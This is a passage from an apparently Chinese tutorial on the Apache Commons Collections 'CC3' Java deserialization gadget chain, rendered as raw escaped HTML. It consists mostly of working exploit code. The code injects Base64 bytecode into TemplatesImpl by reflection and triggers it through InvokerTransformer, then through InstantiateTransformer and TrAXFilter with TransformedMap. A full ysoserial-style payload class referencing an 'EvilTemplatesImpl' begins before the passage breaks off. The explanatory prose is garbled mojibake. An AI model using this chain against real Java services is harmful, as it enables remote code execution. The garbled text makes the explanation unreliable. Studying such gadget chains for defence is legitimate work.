&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Field&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Base64&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.HashMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Map&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">testCC3mini&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">code&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDecoder&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">decode&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE=&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">TemplatesImpl&lt;/span> &lt;span style="color:#111">obj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TemplatesImpl&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_bytecodes&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[][]{&lt;/span>&lt;span style="color:#111">code&lt;/span>&lt;span style="color:#f92672">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_name&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;HelloTemplatesImpl&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_tfactory&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TransformerFactoryImpl&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">transformers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;newTransformer&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">null&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ChainedTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">transformers&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">innerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">outerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">TransformedMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">decorate&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">innerMap&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">outerMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;test&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;amiz&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">fieldName&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">field&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">fieldName&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä½†æ˜¯å¹¶ä¸æ˜¯æ ‡å‡†çš„payloadï¼Œysoserialä¸­å¹¶æ²¡æœ‰ç”¨åˆ°InvokerTransformerï¼ŒåŽŸå› æ˜¯&lt;code>SerialKiller&lt;/code>çš„å­˜åœ¨é™åˆ¶äº†å®ƒï¼Œæˆ‘ä»¬æ¢ä¸º&lt;code>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&lt;/code>&lt;/p>
&lt;p>è¿™ä¸ªç±»çš„æž„é€ æ–¹æ³•ä¸­è°ƒç”¨äº†äº†&lt;code>(TransformerImpl) templates.newTransformer()&lt;/code>ï¼Œå…åŽ»äº†æˆ‘ä»¬çš„æ‰‹å·¥è°ƒç”¨&lt;/p>
&lt;p>ç¼ºå°‘InvokerTransformeræ— æ³•è°ƒç”¨TraAXFilterçš„æž„é€ æ–¹æ³•ï¼Œè¿™é‡Œç”¨&lt;code>org.apache.commons.collections.functors.InstantiateTransformer&lt;/code>è¿™ä¸ªTransformer&lt;/p>
&lt;p>æ‰€ä»¥æˆ‘ä»¬åˆ©ç”¨&lt;code>InstantiateTransformer&lt;/code>è°ƒç”¨åˆ°&lt;code>TrAXFilter&lt;/code>çš„æž„é€ æ–¹æ³•ï¼Œå†åˆ©ç”¨å®ƒæž„é€ æ–¹æ³•ä¸­çš„&lt;code>templates.newTransformer&lt;/code>è°ƒç”¨åˆ°&lt;code>TemplatesImpl&lt;/code>é‡Œçš„å­—èŠ‚ç &lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">transformers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">TrAXFilter&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InstantiateTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">Templates&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å®Œæ•´CC3&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">ysoserial.payloads&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javassist.ClassPool&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.Transformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.ChainedTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.ConstantTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.InstantiateTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.map.TransformedMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javax.xml.transform.Templates&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ByteArrayInputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ObjectInputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.annotation.Retention&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Constructor&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Field&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.InvocationHandler&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Base64&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.HashMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Map&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">testCC3&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">TemplatesImpl&lt;/span> &lt;span style="color:#111">obj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TemplatesImpl&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// setFieldValue(obj, &amp;#34;_bytecodes&amp;#34;, new byte[][]{Base64.getDecoder().decode(&amp;#34;yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE=&amp;#34;)});
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_bytecodes&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[][]{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ClassPool&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDefault&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">evil&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">EvilTemplatesImpl&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">()).&lt;/span>&lt;span style="color:#75af00">toBytecode&lt;/span>&lt;span style="color:#f92672">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_name&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;HelloTemplatesImpl&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_name&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;HelloTemplatesImpl&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_tfactory&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TransformerFactoryImpl&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">fakeTransformers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">};&lt;/span>
